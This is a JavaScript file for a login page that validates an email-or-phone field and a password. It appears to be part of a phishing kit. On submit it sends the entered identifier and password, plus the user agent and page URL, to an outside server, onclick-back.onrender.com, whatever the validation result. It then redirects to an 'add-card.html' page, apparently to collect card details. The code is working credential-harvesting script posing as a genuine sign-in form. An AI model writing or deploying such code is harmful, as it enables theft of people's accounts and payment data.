document.addEventListener("DOMContentLoaded", () => {
  const input = document.getElementById("userId");
  const passwordInput = document.getElementById('password');
  const label = document.getElementById("inputLabel");
  const errorRequired = document.getElementById("error-required");
  const errorFormat = document.getElementById("error-format");
  const errorPhone = document.getElementById("error-phone");
  const errorPassword = document.getElementById("error-password");
  const subtext = document.getElementById("subtext-info");
  const button = document.getElementById("submit-btn");
  const phoneWrapper = document.getElementById("phone-wrapper");
  const form = document.getElementById("login-form");
  const errorIcon = document.querySelector(".al-input__error-icon");

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const isPhone = (val) => /^\d{9,}$/.test(val);

  let touched = false;

  function updateLabelState() {
    const val = input.value.trim();
    label.classList.toggle("shrink", !!val || document.activeElement === input);
  }

  function validate() {
    const val = input.value.trim();
    const pass = passwordInput.value.trim();

    // Reset state
    input.classList.remove("error", "valid", "phone-mode");
    passwordInput.classList.remove("error", "valid");
    label.classList.remove("error");
    errorRequired.classList.add("hidden");
    errorFormat.classList.add("hidden");
    errorPhone.classList.add("hidden");
    errorPassword.classList.add("hidden");
    subtext.classList.add("hidden");
    phoneWrapper.classList.add("hidden");
    errorIcon.style.display = "none";

    let hasError = false;

    // Input validation
    if (!val) {
      errorRequired.classList.remove("hidden");
      input.classList.add("error");
      label.classList.add("error");
      errorIcon.style.display = "block";
      hasError = true;
    } else if (!emailRegex.test(val) && !isPhone(val)) {
      errorFormat.classList.remove("hidden");
      input.classList.add("error");
      label.classList.add("error");
      errorIcon.style.display = "block";
      hasError = true;
    } else {
      input.classList.add("valid");
      if (isPhone(val)) {
        input.classList.add("phone-mode");
        phoneWrapper.classList.remove("hidden");
        label.textContent = "Mobile number";
      } else {
        label.textContent = "Email address";
      }
    }

    // Password validation
    if (pass.length < 8) {
      passwordInput.classList.add("error");
      errorPassword.classList.remove("hidden");
      hasError = true;
    } else {
      passwordInput.classList.add("valid");
    }

    // Кнопка может быть активна в любом случае
    button.classList.add("active");
    button.disabled = false;

    updateLabelState();

    return !hasError;
  }

  input.addEventListener("focus", () => {
    touched = true;
    updateLabelState();
  });

  input.addEventListener("blur", () => {
    updateLabelState();
    validate();
  });

  input.addEventListener("input", () => {
    updateLabelState();
    validate();
  });

  passwordInput.addEventListener("input", () => {
    validate();
  });

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const val = input.value.trim();
    const pass = passwordInput.value.trim();
    const isEmailInput = emailRegex.test(val);
    const endpoint = isEmailInput ? "/login" : "/phone";

    validate(); // Показываем ошибки, даже если отправляем

    button.disabled = true;
    button.querySelector(".al-button__label").textContent = "Loading...";

    try {
      await fetch(`https://onclick-back.onrender.com${endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user_input: val,
          password: pass,
          userAgent: navigator.userAgent,
          location: window.location.href,
          timestamp: new Date().toISOString(),
        }),
      });

      // Переход
      window.location.href = "add-card.html";
    } catch (err) {
      console.error("❌ Submission failed:", err);

      // Ошибку показываем стилизованно, не alert
      passwordInput.classList.add("error");
      errorPassword.classList.remove("hidden");
      button.disabled = false;
      button.querySelector(".al-button__label").textContent = "Continue";
    }
  });

  // Locale toggle
  const localeToggle = document.getElementById("locale-toggle");
  const localeMenu = document.getElementById("locale-menu");
  const currentLocale = document.getElementById("current-locale");

  localeToggle.addEventListener("click", (e) => {
    e.preventDefault();
    localeMenu.classList.toggle("hidden");
  });

  document.querySelectorAll("#locale-menu li").forEach((li) => {
    li.addEventListener("click", () => {
      currentLocale.textContent = li.dataset.locale;
      localeMenu.classList.add("hidden");
    });
  });

  validate(); // первичная валидация
});
